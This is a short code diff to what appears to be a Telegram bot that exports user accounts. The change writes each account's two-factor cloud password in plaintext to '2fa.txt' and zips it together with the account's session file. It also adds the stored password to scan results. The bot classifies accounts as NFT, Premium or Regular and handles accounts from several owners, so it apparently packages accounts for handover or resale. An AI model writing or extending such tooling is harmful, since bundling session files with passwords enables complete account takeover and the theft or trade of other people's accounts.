@@ -82,9 +82,16 @@ async def _export_one(chat_id: int, acc: dict):
     workdir = tempfile.mkdtemp(prefix="vex_")
     try:
         session_path = build_session_file(acc["session"], os.path.join(workdir, safe))
+        # 2fa.txt — the account's cloud password recorded at add-time.
+        # Empty file when the account has no 2FA (Telegram can't reveal an
+        # existing password, so this is always the value entered via the bot).
+        twofa_path = os.path.join(workdir, "2fa.txt")
+        with open(twofa_path, "w", encoding="utf-8") as tf:
+            tf.write(acc.get("twofa", "") or "")
         zip_path = os.path.join(workdir, f"@{safe}.zip")
         with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zf:
             zf.write(session_path, arcname=f"{safe}.session")
+            zf.write(twofa_path, arcname="2fa.txt")
 
         badge = "💫 NFT" if acc["category"] == "nft" else ("⚡ Premium" if acc["category"] == "premium" else "👥 Regular")
         caption = (
@@ -214,6 +221,7 @@ async def _run_scan(chat_id: int):
         info = await classify_account(row["session"], tag=f"{row['owner_id']}_{row['acc_index']}")
         info["owner_id"] = row["owner_id"]
         info["acc_index"] = row["acc_index"]
+        info["twofa"] = row.get("twofa", "") or ""
         accounts.append(info)
         if i % 3 == 0 or i == total:
             await safe_edit_text(
